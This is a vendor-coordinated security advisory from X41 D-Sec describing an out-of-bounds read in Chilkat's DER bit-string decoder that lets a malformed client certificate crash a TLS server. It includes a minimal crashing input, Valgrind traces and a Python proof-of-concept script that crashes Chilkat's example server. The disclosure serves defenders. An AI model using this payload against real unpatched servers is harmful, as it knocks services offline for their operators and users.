@@ -1,0 +1,215 @@
+
+X41 D-Sec GmbH Security Advisory: X41-2024-003
+
+DoS Vulnerability in Chilkat's ASN.1 Decoder
+============================================
+
+Severity Rating: High
+Confirmed Affected Versions: < v9.5.0.99
+Confirmed Patched Versions: >= v9.5.0.99
+Vendor: Chilkat Software, Inc.
+Vendor URL: Network
+Vendor Reference: https://cknotes.com/chilkat-v9-5-0-99-release-notes/
+Vector: Network
+Credit: X41 D-Sec GmbH, Yasar Klawohn, Eric Sesterhenn
+Status: Public
+CVE: Pending
+CWE 125: Out-of-bounds Read
+CVSS Score: 8.2/High
+CVSS Vector:
+CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N
+Advisory-URL:
+https://www.x41-dsec.de/lab/advisories/x41-2024-003-chilkat-asn1/
+
+Summary and Impact
+==================
+
+Software making use of Chilkat library versions before 9.5.0.99 is potentially
+vulnerable to a denial of service attack due to invalid handling of bit
+strings in the DER certificate decoder. This includes Chilkat's TLS server
+where an attacker can cause a segmentation fault by sending a malformed client
+certificate to the server, irrespective of whether the server expected a
+client certificate or not.
+
+Product Description
+===================
+
+The Chilkat library implements many popular Internet protocols, data formats,
+and algorithms and is available for over 30 different programming languages
+and runs on Windows, Mac OS, Linux, iOS, Android and ARM Single Board
+Computers. One of the available formats is DER decoding, which is used by its
+TLS server functionality.
+
+Analysis
+========
+
+The ASN.1 decoder in Chilkat reads out-of-bounds if a 1-bit string is
+specified but not present.
+
+Crashing input, minimized with afl-tmin[^0]:
+
+    > xxd crash.min
+    00000000: 3010 3001 3030 0330 3030 0301 0130 3030  0.0.00.000...000
+    00000010: 3030                                     00
+
+
+Running it on the example[^1] code provided by Chilkat using Valgrind[^2]'s
+memcheck[^3]:
+
+    > cat crash.min | valgrind ./main
+    ...
+    Invalid read of size 1
+       at 0x25DD13: _ckDer::decode_bit_string(...)
+       by 0x260855: _ckDer::decode_sequence_flexi(...)
+       by 0x2600D6: _ckDer::decode_sequence_flexi(...)
+       by 0x261465: _ckDer::der_to_xml(...)
+       by 0x1E18FA: ClsAsn::AsnToXml(XString&)
+       by 0x126D07: CkAsn::AsnToXml(CkString&)
+       by 0x126D3D: CkAsn::asnToXml()
+       by 0x1263A7: fuzz_func()
+       by 0x125FB8: main
+     Address 0x4dc6fd0 is 0 bytes after a block of size 64 alloc'd
+       at 0x4844723: operator new[](unsigned long) (vg_replace_malloc.c:725)
+       by 0x13B980: ckNewUnsignedChar(unsigned int)
+       by 0x1B8E6F: DataBuffer::reallocate(unsigned int) [clone .part.1]
+       by 0x1BB0FF: DataBuffer::appendChar(unsigned char)
+       by 0x2B8021: _ckAsn1::EncodeToDer(DataBuffer&, bool, LogBase&)
+       by 0x1E188E: ClsAsn::AsnToXml(XString&)
+       by 0x126D07: CkAsn::AsnToXml(CkString&)
+       by 0x126D3D: CkAsn::asnToXml()
+       by 0x1263A7: fuzz_func()
+       by 0x125FB8: main
+    
+    ...
+    
+    Process terminating with default action of signal 11 (SIGSEGV): dumping core
+     Access not within mapped region at address 0x51A4000
+       at 0x25DD13: _ckDer::decode_bit_string(...)
+       by 0x260855: _ckDer::decode_sequence_flexi(...)
+       by 0x2600D6: _ckDer::decode_sequence_flexi(...)
+       by 0x261465: _ckDer::der_to_xml(...)
+       by 0x1E18FA: ClsAsn::AsnToXml(XString&)
+       by 0x126D07: CkAsn::AsnToXml(CkString&)
+       by 0x126D3D: CkAsn::asnToXml()
+       by 0x1263A7: fuzz_func()
+       by 0x125FB8: main
+    
+    HEAP SUMMARY:
+        in use at exit: 4,295,068,612 bytes in 64 blocks
+      total heap usage: 170 allocs, 106 frees, 4,295,101,220 bytes allocated
+    ...
+    fish: Process 5454, 'valgrind' from job 1, 'cat crash.min | valgrind ../main'
+      terminated by signal SIGSEGV (Address boundary error)
+
+
+Attackers that can supply malformed certificates can thus crash the programs.
+This also includes Chilkat's TLS server, where the affected ASN.1 decoder is
+called to parse a client certificate if a client supplies one as part of the
+initial handshake.
+
+afl-tmin has a relatively simple algorithm[^4] that is not always able to find
+the smallest input. Using afl's crash exploration[^5] mode by including the -C
+flag and another run of afl-tmin on the resulting output lead to the minimal
+test case of 03 01 3f.
+
+According to the specification[^6] for DER encoding, 03013f is a header that
+means that a bit string (03) (see section 8.6.4.2) of length 01 follows the
+header. Additionally, 8.6.2.2 states "The initial octet shall encode, as an
+unsigned binary integer with bit 1 as the least significant bit, the number of
+unused bits in the final subsequent octet. The number shall be in the range
+zero to seven." That means 3f encodes the amount of unused bits of the last
+byte.
+
+Examples:
+* 03 02 00 aa is the 8-bit bit string (0 unused bits): 10101010
+* 03 02 01 aa is the 7-bit bit string (1 unused bit): 1010101
+* 03 01 3f is the 0-bit bit string with 63 unused bits
+
+If the third example is supplied to Chilkat's DER decoder, it reads 1 byte
+outside the bounds of the buffer, resulting in a segmentation fault.
+
+Proof of Concept
+================
+
+The below script (full version[^7]) crashes Chilkat's
+example[^8] TLS server
+(main.cpp[^9], make.sh[^10]):
+
+    #!/usr/bin/env python3
+    import sys
+    import socket
+    
+    handshake_length = b'\x05\xeb'
+    handshake_prot_cert_length = b'\x00\x05\xe7'
+    certificates_length = b'\x00\x05\xe4'
+    certificate_length = b'\x00\x05\xe1'
+    cert_content = bytes.fromhex('308205dd...')
+    
+    p1 = bytes.fromhex('160301012401000120...')
+    p2 = bytes.fromhex('16030305eb0b0005e7...')
+    
+    p2 = p2.replace(certificate_length, b'\x00\x00\x03')
+    # + 3
+    p2 = p2.replace(certificates_length, b'\x00\x00\x07')
+    # + 3
+    p2 = p2.replace(handshake_prot_cert_length, b'\x00\x00\x0a')
+    # + 4
+    p2 = p2.replace(handshake_length, b'\x00\x0e')
+    
+    p2 = p2.replace(cert_content, b'\x03\x01\x3f')
+    
+    s = socket.socket()
+    s.connect(("127.0.0.1", 8123))
+    s.send(p1)
+    print("Sent initial handshake")
+    ret = s.recv(10000)
+    print(ret)
+    s.send(p2)
+    print("Sent payload to crash certificate parser")
+
+
+    # terminal 1: web server
+    $ ./main
+    # terminal 2: exploit
+    $ ./reproduce.py
+    Sent initial handshake
+    Sent payload to crash certificate parser
+    # terminal 1
+    fish: Job 1, './main 8125' terminated by signal SIGSEGV (Address boundary
+      error)
+
+
+Timeline
+========
+
+2024-04-22 Issue reported to Chilkat Software
+2024-04-22 Chilkat Software acknowledged the issue and fixed it internally
+2024-07-04 Chilkat v9.5.0.99 released with the fix
+2024-09-11 CVE requested
+2024-09-12 Advisory released
+
+About X41 D-Sec GmbH
+====================
+
+X41 is an expert provider for application security services. Having extensive
+industry experience and expertise in the area of information security, a
+strong core security team of world class security experts enables X41 to
+perform premium security services.
+
+Fields of expertise in the area of application security are security centered
+code reviews, binary reverse engineering and vulnerability discovery. Custom
+research and IT security consulting and support services are core competencies
+of X41.
+
+
+[^0]: https://manpages.ubuntu.com/manpages/xenial/man1/afl-tmin.1.html
+[^1]: https://www.example-code.com/cpp/asn_pem_to_xml.asp
+[^2]: https://valgrind.org/
+[^3]: https://valgrind.org/docs/manual/mc-manual.html
+[^4]: https://github.com/google/AFL/blob/master/docs/technical_details.txt#L285-L303
+[^5]: https://lcamtuf.blogspot.com/2014/11/afl-fuzz-crash-exploration-mode.html
+[^6]: https://www.itu.int/rec/T-REC-X.690-202102-I/en
+[^7]: reproduce.py
+[^8]: https://www.example-code.com/cpp/ssl_server.asp
+[^9]: main.cpp
+[^10]: make.sh
